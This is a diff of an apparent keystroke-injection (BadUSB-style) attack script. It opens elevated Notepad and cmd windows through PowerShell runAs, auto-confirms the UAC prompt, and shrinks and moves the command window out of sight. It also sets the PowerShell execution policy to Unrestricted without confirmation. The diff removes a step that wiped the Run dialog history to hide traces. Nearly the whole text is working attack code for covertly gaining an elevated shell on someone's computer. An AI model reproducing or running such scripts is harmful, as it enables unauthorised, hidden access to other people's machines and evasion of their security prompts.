@@ -3,9 +3,9 @@ GUI r
 DELAY 150
 STRING powershell Start-Process notepad -Verb runAs
 ENTER
-DELAY 500
-ALT y
-DELAY 200
+DELAY 100  
+ENTER
+DELAY 100
 ALT SPACE 
 DELAY 20
 STRING m 
@@ -30,8 +30,6 @@ GUI r
 DELAY 150  
 STRING powershell Start-Process cmd -Verb runAs 
 ENTER
-DELAY 500
-ALT y
 DELAY 200  
 STRING mode con:cols=15 lines=1 
 ENTER
@@ -41,9 +39,6 @@ STRING m
 DELAY 150   
 DOWNARROW 
 REPEAT 100
-ENTER
-REM Clear the Run history and exit
-STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
 ENTER
 STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
 ENTER
